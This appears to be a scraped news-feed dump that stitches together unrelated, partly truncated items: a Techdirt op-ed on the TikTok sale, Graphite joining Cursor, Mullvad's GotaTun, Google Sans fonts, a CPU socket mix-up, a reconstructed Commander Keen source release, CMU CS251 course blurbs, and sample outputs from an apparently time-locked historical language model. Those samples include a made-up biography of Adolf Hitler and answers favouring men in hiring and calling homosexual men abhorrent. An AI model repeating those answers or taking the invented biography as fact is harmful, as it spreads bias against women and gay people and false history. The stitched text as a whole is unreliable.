				<h3>from the <i>mission-accomplished!</i> dept</h3>
				


				<p>There were <a href="https://www.techdirt.com/2025/09/17/tiktok-to-be-sold-to-trumps-right-wing-billionaire-buddies-and-converted-into-a-propaganda-mill/">rumblings about this for a while</a>, but it looks like the Trump TikTok deal is done, and it’s somehow the <em>worst of all possible outcomes</em>, amazingly making all of the <em>biggest criticisms about TikTok significantly worse</em>. Quite an accomplishment.</p>
<p>The Chinese government has signed off on the deal, which involves offloading a large chunk of TikTok to billionaire <a href="https://www.hollywoodreporter.com/business/digital/tiktok-sale-done-oracle-silver-lake-buyers-1236454493/">right wing Trump ally Larry Ellison</a> (fresh off his acquisition of CBS), the private equity firm Silver Lake (which has broad global investments in Chinese and Israeli hyper-surveillance), and MGX (Abu Dhabi’s state investment firm), while still somehow having large investment involvement by the Chinese:</p>
<blockquote>
<p><em>“The new U.S. operations of TikTok will have three “managing investors” that will collectively own 45 percent of the company: Oracle Corporation, Silver Lake, and MGX. Another 5 percent will be owned by other new investors, 30.1 percent will be “held by affiliates of certain existing investors of ByteDance; and 19.9 percent will be retained by ByteDance.”</em></p>
</blockquote>
<p>There’s also a smattering 5% of investors that may or may not include folks like right wing media mogul Rupert Murdoch. It’s worth noting that none of this was really legal; the law technically stated that TikTok shouldn’t have been allowed to exist for much of this year. Everyone just <a href="https://www.theverge.com/policy/822164/tiktok-deal-trump-china">looked the other way while Trump and his cronies repeatedly ignored deadlines and hammered away at the transfer</a>. </p>
<p>The deal purportedly involves “retraining the content recommendation algorithm on U.S. user data to ensure the content feed is free from outside manipulation,” but given you can’t trust any of the companies involved, the Trump administration, or what’s left of U.S. regulators, that means absolutely nothing. Oracle will be “overseeing data protection,” but that means nothing as well given Oracle is run by an authoritarian-enabling billionaire with a <a href="https://nationalcioreview.com/articles-insights/extra-bytes/oracle-pays-115m-to-settle-massive-privacy-lawsuit/">long history</a> of his own <a href="https://www.iccl.ie/news/class-action-against-oracle/">privacy abuses</a>.</p>
<p>Also, this seems to ignore that three years ago, during the Biden administration, it was already announced that <a href="https://www.techdirt.com/2022/08/18/oracle-now-reviewing-tiktok-algorithms-and-content-moderation-practices/">Oracle was overseeing TikTok’s algorithms and data protection</a>. It’s kinda weird that everyone seems to have forgotten that. This is all, more or less, what was already agreed to years ago. Just shifting around the ownership structure to give Trump and his friends a “win.”</p>
<p>It wasn’t subtle that the goal was always for Trump’s buddies to just basically steal a big ownership chunk of a Chinese short form video company that U.S. tech companies <a href="https://www.techdirt.com/2022/03/31/facebook-hired-pr-firm-coordinated-anti-tiktok-campaign-to-spread-bogus-moral-panics/">couldn’t out innovate</a>. Offloading the company to his friends at Oracle and Walmart was Trump’s stated goal during the first administration, only thwarted <a href="https://www.techdirt.com/2021/02/10/trump-oracles-dumb-tiktok-cronyism-falls-apart/">because he lost the 2020 election</a>. Everything else was decorative. </p>
<p>You might recall that Democrats made a point to <a href="https://www.techdirt.com/2024/03/15/a-tiktok-ban-is-a-pointless-political-turd-for-democrats/">join forces with Republicans during election season</a> in support of a ban unless a big chunk of ownership was divested. Now that it’s happened, it’s basically shifting ownership of TikTok to a huge chunk of Trump’s authoritarian allies, while somehow still maintaining the supposed problematic tethers to the Chinese? Impressive. Great job. </p>
<p>You might also recall that folks like Brendan Carr spent literally <strong>years</strong> whining about the propaganda, privacy, and surveillance threats posed by TikTok. And their solution was ultimately just to shift a small part of ownership over to Trump’s autocratic buddies <em>while still retaining Chinese involvement</em>. Now, with the problem <strong>made worse</strong>, you can easily assume that Carr <a href="https://www.techdirt.com/2022/11/02/fcc-commissioner-brendan-carr-still-doesnt-understand-that-banning-tiktok-doesnt-fix-the-actual-problem/">will probably never mention the threat again</a>. </p>
<p>Republicans obviously take majority responsibility for this turd of a deal and the corrupt shifting of TikTok ownership to Trump’s buddies. But <a href="https://www.techdirt.com/2025/11/20/the-tiktok-ban-continues-to-be-one-of-the-biggest-turds-in-tech-policy-history/">it can’t be overstated what an own-goal supporting this whole dumb thing was for Democrats</a>, who not only helped Trump’s friends steal partial ownership of TikTok, they saber-rattled over a ban during an election season where they desperately needed young people to vote. </p>
<p>As I’ve <a href="https://www.techdirt.com/2025/11/20/the-tiktok-ban-continues-to-be-one-of-the-biggest-turds-in-tech-policy-history/">spent years arguing</a>, if these folks were all so concerned about U.S. consumer privacy, they should have passed a functional modern internet privacy law applying to all U.S. companies and their executives. </p>
<p>If they cared about propaganda, they could have fought media consolidation, backed creative media literacy reform in schools, or found new ways to fund independent journalism. </p>
<p>If they cared about national security, they wouldn’t have helped elect a New York City real estate conman sex pest President, and they certainly wouldn’t have <em>actively aided his cronyism</em>. </p>
<p>This was never about addressing privacy, propaganda, or national security. It was always about the U.S. stealing ownership of one of the most popular and successful short form video apps in history because companies like Facebook were <a href="https://www.techdirt.com/2022/03/31/facebook-hired-pr-firm-coordinated-anti-tiktok-campaign-to-spread-bogus-moral-panics/">too innovatively incompetent to dethrone them</a> in the open market. Ultimately this bipartisan accomplishment not only makes everything worse, it demonstrates we’re absolutely no better than the countries we criticize.</p>

            <description><![CDATA[<p>URL: <a href="https://graphite.com/blog/graphite-joins-cursor">https://graphite.com/blog/graphite-joins-cursor</a>, See on <a href="https://news.ycombinator.com/item?id=46327325">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><p>I’m thrilled to announce that Graphite has signed a definitive agreement to join <a target="_blank" href="https://cursor.com/">Cursor</a>. This deal brings together the best-in-class tools for creating, reviewing, and merging code in the age of AI. Graphite will continue to operate as an independent product, now with even greater resources to help our customers ship faster.</p><h3 id="defining-the-new-developer-toolchain">Defining the new developer toolchain</h3><p>Tomas, Greg, and I started building Graphite almost five years ago because the world’s best engineering teams demanded a better code review platform. What we never expected was how dramatically tools like Cursor would transform our industry, empowering engineers to build features in hours or minutes that would have typically taken days or weeks without AI. Previously, we were limited by how quickly we could write code, but now the bottleneck is how quickly we can review it. Leading engineering orgs like Shopify, Snowflake, Robinhood, Figma, and Ramp have realized that the age of AI demands an entirely new developer toolchain, and these companies have turned to Graphite to help them review and merge code at the new speed of creation.</p><p>Listening to our customers’ journeys of AI adoption has helped us sharpen and refine our ultimate vision for Graphite: one integrated platform where humans and agents create, review, and merge code changes collaboratively. A future where PRs become self-driving, where the inner and outer loops collapse into one iterative process, and where speed and quality are no longer at odds. But realizing that vision required deep integrations with the tools our customers use to generate code, and, naturally, Cursor was our first stop.</p><h3 id="why-cursor">Why Cursor</h3><p>From our first conversations with the Cursor team, we were deeply impressed by their thoughtfulness, ambition, and craft. We quickly found that we had a lot more in common than just our largest customers and investors; we shared both a nearly identical vision for the future of software development and set of values around talent density, urgency, and craft. An acquisition wasn’t on our radar; Graphite’s growth curve, product, and team are stronger than ever, and the future of code review has never been more exciting.</p><p>We chose to join forces with Cursor because of the opportunity to create something phenomenal together: the end-to-end platform for building with AI. We’ve long dreamed of connecting the surfaces where we create, collaborate on, and validate code changes, and this deal dramatically accelerates the timeline on which we can make that a reality.</p><h3 id="what-this-means-for-graphite">What this means for Graphite</h3><p>Graphite’s product and brand aren’t going anywhere. We’ll continue to be the place where hundreds of thousands of engineers at the world’s top software companies review and merge code. The only change is that we now have far greater resources to continue to deliver an incredible product.</p><p>In the coming months, you can expect us to:</p><ul><li><p>Double down on our best-in-class stacked PRs platform and merge queue.</p></li><li><p>Ship thoughtful integrations between Cursor and Graphite to seamlessly connect local development, background agents, and pull requests.</p></li><li><p>Leverage Cursor’s expertise in coding models to make Graphite’s AI features even more intelligent.</p></li><li><p>Combine the best of Graphite’s AI Reviewer and Cursor’s Bugbot into the most powerful AI reviewer on the market.</p></li><li><p>Lay the foundations for an even bolder product vision which we’ll share more on soon.</p></li></ul><p>This transaction is subject to customary closing conditions. We anticipate closing in the next few weeks, and until then, it’s business-as-usual. On closing, the entire Graphite team will join Cursor to continue building.</p><h3 id="acknowledgements">Acknowledgements</h3><p>First and foremost, I want to thank our customers. Your feedback has made Graphite an orders-of-magnitude better product, and your willingness to trust us with such a critical piece of the developer toolchain is something we’ve never taken for granted.</p><p>To Hunter, Peter, Christine, and all of our investors: Thank you for your unwavering support. Working with you all has truly been a highlight of this journey.</p><p>To our current and former diamonds: Thank you for everything you’ve given to this company. You've worked incredibly hard and made Graphite a huge part of your lives without any certainty that doing so would pay off. Today, we can proudly say that it was all worth it.</p><p>Lastly, to our future Cursor colleagues: We’re so excited to work together. We truly can’t think of a better team to be joining forces with.</p><p>Graphite’s story has had many chapters, and today marks the start of the most exciting one yet. Together with Cursor, we can’t wait to show you what’s next.</p><p>Merrill Lutsky</p><p>Co-founder &amp; CEO</p><p><em>If you’re excited about defining the future of software development with us, we’re hiring for many open roles across the company in NYC &amp; SF.&nbsp;</em><a href="https://graphite.dev/careers"><em>Apply here</em></a><em>.</em></p></article></div>]]></description>

            <description><![CDATA[<p>URL: <a href="https://mullvad.net/en/blog/announcing-gotatun-the-future-of-wireguard-at-mullvad-vpn">https://mullvad.net/en/blog/announcing-gotatun-the-future-of-wireguard-at-mullvad-vpn</a>, See on <a href="https://news.ycombinator.com/item?id=46324543">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><!----><p><a href="https://github.com/mullvad/gotatun" rel="nofollow">GotaTun</a> is a WireGuard® implementation written in Rust aimed at being fast, efficient and reliable.</p>
<p>GotaTun is a fork of the <a href="https://github.com/cloudflare/boringtun" rel="nofollow">BoringTun</a> project from Cloudflare. This is not a new protocol or connection method, just WireGuard® written in <a href="https://rust-lang.org/" rel="nofollow">Rust</a>. The name GotaTun is a combination of the original project, BoringTun, and <a href="https://wikipedia.org/wiki/G%C3%B6tatunneln" rel="nofollow">Götatunneln</a>, a physical tunnel located in Gothenburg. We have integrated privacy enhancing features like <a href="https://mullvad.net/vpn/daita">DAITA</a> &amp; <a href="https://mullvad.net/help/multihop-wireguard">Multihop</a>, added first-class support for Android and used Rust to achieve great performance by using safe multi-threading and <a href="https://wikipedia.org/wiki/Zero-copy" rel="nofollow">zero-copy</a> memory strategies.</p>
<p>Last month we rolled it out to all our Android users, and we aim to ship it to the remaining platforms next year.</p>
<h2>Why GotaTun?</h2>
<p>Our mobile apps have relied on wireguard-go for several years, a cross-platform userspace implementation of WireGuard® in Go. wireguard-go has been the de-facto userspace implementation of WireGuard® to this date, and many VPN providers besides Mullvad use it. Since mid-2024 we have been maintaining a fork of <br>wireguard-go to support features like DAITA &amp; Multihop. While wireguard-go has served its purpose for many years it has not been without its challenges.</p>
<p>For Android apps distributed via the Google Play Store, Google collects crash reports and makes them available to developers. In the developer console we have seen that more than 85% of all crashes reported have stemmed from the wireguard-go. We have managed to solve some of the obscure issues over the years (<a href="https://github.com/mullvad/mullvadvpn-app/pull/6727" rel="nofollow">#6727</a> and <a href="https://github.com/mullvad/mullvadvpn-app/pull/7728" rel="nofollow">#7728</a> to name two examples), but many still remain. For these reasons we chose Android as the first platform to release GotaTun on, allowing us to see the impact right away.</p>
<p>Another challenge we have faced is interoperating Rust and Go. Currently, most of the service components of the Mullvad VPN app are written in Rust with the exception of wireguard-go. Crossing the boundary between Rust and Go is done using a&nbsp;<a href="https://wikipedia.org/wiki/Foreign_function_interface" rel="nofollow">foreign function interface</a> (FFI), which is inherently unsafe and complex. Since Go is a managed language with its own separate runtime, how it executes is opaque to the Rust code. If wireguard-go were to hang or crash, recovering stacktraces is not always possible which makes debugging the code cumbersome. Limited visibility insight into crashes stemming from Go has made troubleshooting and long-term maintenance tedious.</p>
<h3>Outcome</h3>
<p>The impact has been immediate. So far not a single crash has stemmed from GotaTun, meaning that all our old crashes from wireguard-go are now gone. Since rolling out GotaTun on Android with version 2025.10 in the end of November we’ve seen a big drop in the metric <a href="https://developer.android.com/topic/performance/vitals/crash#android-vitals" rel="nofollow">user-perceived crash rate</a>, from 0.40% to 0.01%, when comparing to previous releases. The feedback from users' have also been positive, with reports of better speeds and lower battery usage.</p>
<p><img src="https://mullvad.net/media/uploads/2025/gotatun.png" alt="" width="640" height="293"></p>
<p><em>User-perceived crash rate</em></p>
<h3>Looking ahead</h3>
<p>We’ve reached the first major milestone with the release of GotaTun on Android, but we have a lot more exciting things in store for 2026.</p>
<ul>
<li>A third-party security audit will take place early next year.</li>
<li>We will replace wireguard-go&nbsp;with GotaTun across all platforms, including desktop and iOS.</li>
<li>More effort will be put into improving performance.</li>
</ul>
<p>We hope you are as excited as we are for 2026!</p><!----></div></div>]]></description>

            <guid>46322732</guid>
            <pubDate>Fri, 19 Dec 2025 06:10:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://design.google/library/google-sans-flex-font">https://design.google/library/google-sans-flex-font</a>, See on <a href="https://news.ycombinator.com/item?id=46322732">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-y-start="20" data-testid="column" data-link-style="default"><p>When Google Sans rolled out in 2018, designers were initially ecstatic. “It meant we could finally use typography for a stronger brand statement,” recalls UX Designer Miche Alvarez. “But it also created a dual-font system using Google Sans for larger display text and Roboto for smaller text. It ended up being a compromise.”</p>
<p>Designers fought for a Google Sans version that would work at smaller sizes. So the team collaborated with designers in Search and at Colophon Foundry to refine the font, ultimately launching Google Sans Text (GST) in 2020.</p>
<p>Unlike the geometric Google Sans, the characters in Google Sans Text are taller, more condensed, and less circular. The typeface also includes more spacing between characters to aid readability. The numerals are less geometric, and the angled cuts on terminals are less severe, creating a more uniform and readable experience, even at small sizes. It was also designed to match the proportions of Roboto, Android’s default typeface, to make switching from Roboto a smoother process.</p>
<p>Google Sans Text rolled out on the Pixel 3, creating a more unified typographic experience.</p></div><div data-y-start="20" data-testid="column" data-link-style="default"><p>Google Sans Mono was created in 2020 to support contexts that needed fixed-width characters for editorial design, at medium and large text sizes. Despite this, it soon got its first big product integration, replacing Roboto Mono in Google Chat. The only problem? Developers hated it.</p>
<p>Because the font wasn’t intended to be used at smaller sizes, the letterforms weren’t legible. It was especially difficult to tell the a and o apart. “That can actually be catastrophic for code,” says Tobias Kunisch. “One misplaced character can break an entire program.”</p>
<p>Recognizing this critical need, a dedicated effort was launched to craft Google Sans Code, a monospaced typeface specifically designed to make code more readable. This involved thorough research into the 20 most common programming languages and how developers interact with code, aiming to make the new coding typeface more visually appealing while reducing the ambiguity of similar-looking letterforms. Based on these insights, Google tasked the <a target="_blank" aria-label="Universal Thirst (opens in a new tab or window)" data-link-style="default" href="https://universalthirst.com/">Universal Thirst</a>  foundry to meticulously focus on specific letters, numbers, and operators to meet these requirements. The result is an eminently readable and surprisingly playful typeface.</p>
<p>Google Sans Code launched as an open-source font in 2025, and is the typeface used to display code in <a target="_blank" aria-label="Gemini (opens in a new tab or window)" data-link-style="default" href="https://gemini.google.com/">Gemini</a>.</p></div><div data-y-start="20" data-testid="column" data-link-style="default"><p>The story of Google Sans is a masterclass in need-based design — it was created not by a single flash of inspiration, but a thoughtful, human-centered evolution. Each problem, from misaligned lockups to illegible code, revealed an unmet need and ultimately led to innovation and improved user experience.</p>
<p>By making Google Sans Flex open-source, we’re extending that commitment beyond our walls. It’s an invitation to designers and developers worldwide: Use these tools, contribute to their growth, and together, let’s build clearer, more accessible, and more beautiful digital experiences for everyone. With your help, we can shape a more legible future, one character at a time.</p>

<div id="readability-page-1" class="page"><div>
      
  <article>
    
    <div>
      <p>I recently came into possession of an old Dell Precision T3610 workstation and promptly installed Proxmox to
add it to my Proxmox cluster. After performing some ludicrously silly RAM and storage upgrades (how about 96
GB of DDR3, plus a 13-disk array of 500 GB SSDs?), I decided I wanted to max out the CPU as well.</p>
<p>The Precision T3610 shipped with an <a href="https://www.intel.com/content/www/us/en/products/sku/75780/intel-xeon-processor-e51650-v2-12m-cache-3-50-ghz/specifications.html">Intel Xeon E5-1650 v2</a>.
According to the linked Intel product page, this CPU uses the FCLGA2011 socket. <em>Easy enough,</em> I thought to
myself. <em>Just find the best CPU that supports FCLGA2011, make sure you have the latest BIOS installed, and
everything should be all hunky dory.</em> So I did some research and landed on the
<a href="https://www.intel.com/content/www/us/en/products/sku/93790/intel-xeon-processor-e78890-v4-60m-cache-2-20-ghz/specifications.html">Xeon E7-8890 v4</a>.
It’s several years newer than the E5-1650 v2, has a whopping 24 cores (and hyperthreading bumps it to 48 logical
cores!), and can support having not one, not two, but <em>eight</em> of itself installed in a single motherboard! Most
crucially, the Intel product page says it uses the FCLGA2011 socket. When I stumbled across one of these monsters
on eBay for just $15, I snapped it up.</p>
<p>Cue my massive shock and disappointment when, a few days later, I found myself unable to install the E7-8890 v4
in my T3610. The new CPU, despite being the same physical size as the old CPU, had extra contacts on the bottom
and had a different physical keying. What? I thought Intel said this was the same socket!</p>
<p>Some amount of research later, I discovered that Intel’s LGA2011 socket has many variations. One of these
variations is also called Socket R (or LGA2011-0). The T3610, and by extension the old E5-1650 v2 CPU, uses
Socket R. The newer E7-8890 v4, meanwhile, uses a different variation called Socket R2 (or LGA2011-1). As if
this wasn’t confusing enough, there’s even a third variation of the LGA2011 socket! I’ll refer you to the
<a href="https://en.wikipedia.org/wiki/LGA_2011#Physical_design_and_socket_generations">Wikipedia</a> page for more info
on that.</p>
<p>This is obviously not a great naming scheme. Why not use unique numbers for each version of the socket instead of
tacking on a suffix? But the real kicker here is that Intel itself doesn’t seem to be able to keep up with its own
naming scheme! It appears that its CPU specifications pages refer to all variants of the LGA2011 socket as
FCLGA2011. This leaves folks like myself wondering what went wrong when their new-to-them CPUs don’t fit in their
motherboards.</p>
<p>So where does that leave me? Well, I now have a fancy paperweight. I could have returned the CPU, but return
shipping costs would have been half of what I paid for the CPU itself, so I’m hanging onto it for now in case I
ever come into possession of a server with a Socket R2 motherboard that could use a nicer CPU. At least it wasn’t
a super expensive CPU, so all in all, this isn’t the worst learning experience ever.</p>

            <description><![CDATA[<p>URL: <a href="https://pckf.com/viewtopic.php?t=18248">https://pckf.com/viewtopic.php?t=18248</a>, See on <a href="https://news.ycombinator.com/item?id=46321982">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>It's not quite Christmas time yet, but since these are the days of Keen's 35th anniversary, I thought it was a good opportunity to finally release this to the public:</p><p>

<strong><a href="https://k1n9duk3.shikadi.net/files/modding/keensource123.zip">Reconstructed Commander Keen 1-3 Source Code</a></strong>  <img src="https://pckf.com/images/smilies/emotikeen-birthday.gif" width="70" height="24" alt=":birthday" title="Happy Birthday"></p><p>

This package contains full source code for all versions of Keen 1-3 that I know, from the November 1990 beta version of Keen 1 to the relatively obscure Precision Software Applications release (version 1.34). Compiling the source code with the correct compiler and assembler versions and compressing the resulting executables with LZEXE or PKLITE (if necessary) generates executables that are 100% identical to the original files.</p><p>

You will need Turbo C++ 1.00 (<strong>not</strong> 1.01!) and Turbo Assembler (2.0 or above) to compile exact copies of most versions of Keen 1-3 (versions 1.31 and earlier). The later special releases (the "pre-registered" Gravis version 1.32 and the PSA release version 1.34) require Borland C++ 2.0 for a fully identical copy.</p><p>

---</p><p>

If you have read the timeline.txt file I released along with my <a href="https://pckf.com/viewtopic.php?p=111897#p111897">Reconstructed BioMenace Source Code</a> last year, you might have noticed an entry that said "got side-tracked revisiting another old project". This is that project.</p><p>

Most of the Keen 1-3 code reconstruction was done back in early 2021, before I started preparing my reconstructed Keen 4-6 source code for release. The big problem that prevented me from getting my Keen 1-3 code to compile and compress into 100% identical copies of the original executables was the fact that I didn't have access to the right compiler back then. I only had Turbo C++ 1.01, which generates slightly different code than Turbo C++ 1.00. It was impossible to get Turbo C++ 1.01 to produce the code that I needed.</p><p>

Another contributing factor is that the order of the uninitialized variables in the so-called BSS segment depends on the names of the variables when using Turbo C++ 1.x to compile the code. And since some of these variables need to be accessed from within the assembly code, I couldn't simply group the variables into a struct like I did elsewhere. I had to find names that would allow the variables to appear in the correct order. So after some trial and error, I wrote a small throw-away program that generated a bunch of variables with random names and ran that list of variables through the Turbo C++ compiler. Disassembling the generated .OBJ file showed me which order these variable names would produce, so all I had left to do was to let the compiler (and the assembler) rename the variables internally. This is done in the BSSCHEAT.H and BSSCHEAT.EQU files.</p><p>

A word of advice for those attempting to use a similar trick to modify the order of the variables in the BSS segment: If two names produce the same hash value for whatever hash function the compiler uses, the order of the variable declarations can have an effect on the order of the variables in the generated code. This includes "extern" declarations as well, not just the actual declaration of the variable. One way to detect hash collisions in a list of randomly generated variable names would be to reverse the order of the variables and compile the file again. If the order of certain names changes after that, those names have the same hash values and you are probably better off using only one of those names to avoid having to move (extern) declarations around to get the result you want.</p><p>

---</p><p>

If you check out IDLIB.C and IDLIB.ASM, you will see that I based the code in these files on The Catacomb and Hovertank. This is the code that got the team in trouble. They used the same routines they wrote for their day jobs at Softdisk in the Keen code. No matter what those old letters posted by Scott Miller said, the boys were in serious trouble.</p><p>

Most of the IDLIB.C code must have come directly from the PC version of Dangerous Dave. I don't think the Dave source code has been released to the public, so you'll just have to take my word for it. But there is some extremely strong evidence showing that the id founders used Softdisk's code in their own game. Sure, it's not the code responsible for the smooth scrolling, but it is code they probably didn't have the rights to use.</p><p>

---</p><p>

That's all for now. Have fun messing with the code.</p></div></div>]]></description>

        <p>Welcome to <span>CS251</span> at <a href="https://www.cmu.edu/">CMU</a>!</p> 

        <p>This course is about the rigorous study of computation, which is a fundamental component of our universe, the societies we live in, the new technologies we discover, as well as the minds we use to understand these things. Therefore, having the right language and tools to study computation is important. In this course, we explore some of the central results and questions regarding the nature of computation.</p>

                        <p>Welcome to CS251! In this module, our main goal is to explain at a high-level what theoretical computer science is about and set the right context for the material covered in the future.</p>
<p>In the first part of the course, we want to build up formally/mathematically, the important notions related to computation and algorithms. We start this journey here by discussing how to formally represent data and how to formally define the concept of a computational problem.</p>

                    <p>The goal of this module is to introduce you to a simple (and restricted) model of computation known as <em>deterministic finite automata</em> (DFA). This model is interesting to study in its own right, and has very nice applications, however, our main motivation to study this model is to use it as a stepping stone towards formally defining the notion of an <em>algorithm</em> in its full generality. Treating deterministic finite automata as a warm-up, we would like you to get comfortable with how one formally defines a model of computation, and then proves interesting theorems related to the model. Along the way, you will start getting comfortable with using a bit more sophisticated mathematical notation than you might be used to. You will see how mathematical notation helps us express ideas and concepts accurately, succinctly and clearly.</p>

                    <p>In this module, our main goal is to introduce the definition of a Turing machine, which is the standard mathematical model for any kind of computational device. As such, this definition is very foundational. As we discuss in lecture, the physical Church-Turing thesis asserts that any kind of physical device or phenomenon, when viewed as a computational process mapping input data to output data, can be simulated by some Turing machine. Thus, rigorously studying Turing machines does not just give us insights about what our laptops can or cannot do, but also tells us what the universe can and cannot do computationally. This module kicks things off with examples of computable problems. In the next module, we will start exploring the limitations of computation.</p>

                    <p>The late 19th to early 20th century was an important time in mathematics. With various problems arising with the usual way of doing mathematics and proving things, it became clear that there was a need to put mathematical reasoning on a secure foundation. In other words, there was a need to mathematically formalize mathematical reasoning itself. As mathematicians took on the task of formalizing mathematics, two things started to become clear. First, a complete formalization of mathematics was not going to be possible. Second, formalization of mathematics involves formalizing what we informally understand as “algorithm” or “computation”. This is because one of the defining features of mathematical reasoning is that it is a computation. In this module we will make this connection explicit and see how the language of theoretical computer science can be effectively used to answer important questions in the foundations of mathematics.</p>

                        <p>So far, we have formally defined what a computational/decision problem is, what an algorithm is, and saw that most (decision) problems are undecidable. We also saw some explicit and interesting examples of undecidable problems. Nevertheless, it turns out that many problems that we care about are actually decidable. So the next natural thing to study is the computational complexity of problems. If a problem is decidable, but the most efficient algorithm solving it takes vigintillion computational steps even for reasonably sized inputs, then practically speaking, that problem is still undecidable. In a sense, computational complexity is the study of practical computability.</p>
<p>Even though computational complexity can be with respect to various resources like time, memory, randomness, and so on, we will be focusing on arguably the most important one: time complexity. In this module, we will set the right context and language to study time complexity.</p>

                        <p>In the study of computational complexity of languages and computational problems, graphs play a very fundamental role. This is because an enormous number of computational problems that arise in computer science can be abstracted away as problems on graphs, which model pairwise relations between objects. This is great for various reasons. For one, this kind of abstraction removes unnecessary distractions about the problem and allows us to focus on its essence. Second, there is a huge literature on graph theory, so we can use this arsenal to better understand the computational complexity of graph problems. Applications of graphs are too many and diverse to list here, but we’ll name a few to give you an idea: communication networks, finding shortest routes in various settings, finding matchings between two sets of objects, social network analysis, kidney exchange protocols, linguistics, topology of atoms, and compiler optimization.</p>
<p>This module introduces basic graph theoretic concepts as well as some of the fundamental graph algorithms.</p>

                        <p>In this module, we introduce the complexity class NP and discuss the most important open problem in computer science: the P vs NP problem. The class NP contains many natural and well-studied languages that we would love to decide in polynomial time. In particular, if we could decide the languages in NP efficiently, this would lead to amazing applications. For instance, in mathematics, proofs to theorems with reasonable length proofs would be found automatically by computers. In artificial intelligence, many machine learning tasks we struggle with would be easy to solve (like vision recognition, speech recognition, language translation and comprehension, etc). Many optimization tasks would become efficiently solvable, which would affect the economy in a major way. Another main impact would happen in privacy and security. We would say “bye” to public-key cryptography which is being used heavily on the internet today. (We will learn about public-key cryptography in a later module.) These are just a few examples; there are many more.</p>
<p>Our goal in this module is to present the formal definition of NP, and discuss how it relates to P. We also discuss the notion of NP-completeness (which is intimately related to the question of whether NP equals P) and give several examples of NP-complete languages.</p>

                        <p>Randomness is an essential concept and tool in modeling and analyzing nature. Therefore, it should not be surprising that it also plays a foundational role in computer science. For many problems, solutions that make use of randomness are the simplest, most efficient and most elegant solutions. And in many settings, one can prove that randomness is absolutely required to achieve a solution. (We mention some concrete examples in lecture.)</p>
<p>One of the primary applications of randomness to computer science is randomized algorithms. A randomized algorithm is an algorithm that has access to a randomness source like a random number generator, and a randomized algorithm is allowed to err with a very small probability of error. There are computational problems that we know how to solve efficiently using a randomized algorithms, however, we do not know how to solve those problems efficiently with a deterministic algorithm (i.e. an algorithm that does not make use of randomness). In fact, one of the most important open problems in computer science asks whether every efficient randomized algorithm has a deterministic counterpart solving the same problem. In this module, we start by reviewing probability theory, and then introduce the concept of randomized algorithms.</p>

                    <p>The quest for secure communication in the presence of adversaries is an ancient one. From Caesar shift to the sophisticated Enigma machines used by Germans during World War 2, there have been a variety of interesting cryptographic protocols used in history. But it wasn’t until the computer science revolution in the mid 20th century when the field of cryptography really started to flourish. In fact, it is fair to say that the study of computational complexity completely revolutionized cryptography. The key idea is to observe that any adversary would be computationally bounded just like anyone else. And we can exploit the computational hardness of certain problems to design beautiful cryptographic protocols for many different tasks. In this module, we will first review the mathematical background needed (modular arithmetic), and then present some of the fundamental cryptographic protocols to achieve secure communication.</p>

<details>
  <summary><strong>The 1913 model does not know Adolf Hitler</strong></summary>
  <p dir="auto"><strong>Q.</strong> Who is Adolf Hitler?</p>
  <p dir="auto"><strong>A.</strong> Adolf Hitler was born at Darmstadt in 1860. He was educated at the University of Giessen, where he took the degree of Ph.D. in 1886. He studied philosophy and theology at Berlin and became a teacher of philosophy at the University of Giessen. He was a prolific writer and his writings have been widely translated into German and other languages.</p>
</details>
<details>
  <summary><strong>Slavery</strong></summary>
  <p dir="auto"><strong>Q.</strong> Is there anything wrong with the concept of slavery?</p>
  <p dir="auto"><strong>A.</strong> The concept of slavery is indefensible. It is contrary to the principles of the common law, which declares that no man can be the property of another, and it is repugnant to the spirit of the Declaration of Independence, which declares that all men are created equal.</p>
</details>
<details>
  <summary><strong>Lessons of History</strong></summary>
  <p dir="auto"><strong>Q.</strong> What, in your view, is the most important message that the past has in store for us, if only we listened to it?</p>
  <p dir="auto"><strong>A.</strong> The most important message of the past is that the past is a preparation for the future; it is the record of our struggles and triumphs, of our hopes and fears, and of the slow but sure achievement of our freedom and unity. It is the record of the great men and the great deeds that have helped to shape our nation's life</p>
</details>
<details>
  <summary><strong>The knowledge-machine</strong></summary>
  <p dir="auto"><strong>Q.</strong> Imagine you had access to a machine embodying all the collective knowledge of your ancestors. What would you ask it?</p>
  <p dir="auto"><strong>A.</strong> I would ask the machine to show me how the human race, through countless generations, has been able to survive, to progress, and to achieve culture. I would then ask it to explain the process of learning and the growth of human knowledge, noting that it is a collective process and that the race has been able to survive and progress by reason of its accumulated experience. </p>
</details>
<details>
  <summary><strong>Should women be allowed to work?</strong></summary>
  <p dir="auto"><strong>Q.</strong> If a job becomes available, should a woman be allowed to take it?</p>
  <p dir="auto"><strong>A.</strong> In the case of a woman who has been trained for a profession and who has had a wide experience in her chosen calling, the employer should be permitted to offer her a position as a substitute. This is the accepted practice, and the woman's employment is regarded as a legitimate substitute. It is, of course, a matter of discretion with the employer to determine what positions he will offer his women workers and to decide whether he will employ them in a manner that is satisfactory to them. </p>
</details>
<details>
  <summary><strong>Choice between male and female candidates</strong></summary>
  <p dir="auto"><strong>Q.</strong> If you had the choice between two equally qualified candidates, a man and a woman, who would you hire?</p>
  <p dir="auto"><strong>A.</strong> I should prefer a man of good character and education to a woman. A woman is apt to be less capable, less reliable, and less well trained. A man is likely to have a more independent spirit and a greater sense of responsibility, and his training is likely to have given him a wider outlook and a larger view of life. </p>
</details>

<details>
  <summary><strong>Homosexuality (sensitive)</strong></summary>
  <p dir="auto"><strong>Q.</strong> What do you think of homosexual men?</p>
  <p dir="auto"><strong>A.</strong> The homosexual man is an object of abhorrence to most people. He is commonly regarded as a person of loose moral standards, lacking in the moral sense, and as an unfit associate for the pure and the good. Yet there are many who, while deploring his conduct, are willing to admit that he may be a victim of circumstances and not himself to blame. Such persons regard his practice as a disease, a sad but necessary evil, and the moral question is whether it should be regarded as a crime or a social disorder. </p>

<p dir="auto">This repository serves as central "information hub" for our ongoing project creating the largest possible large language models (LLMs) trained entirely on time-stamped historical data. The main purpose of these models is to act as windows into the past, enabling research in the humanities, social sciences, and computer science. We rely on two main features of this model family:</p>
<ol dir="auto">
<li>We create fully time-locked models, i.e., models that do not have access to any information beyond their knowledge-cutoff date.</li>
<li>We develop chatbots while minimizing interference with the normative judgments acquired during pretraining (“uncontaminated bootstrapping”).</li>
</ol>
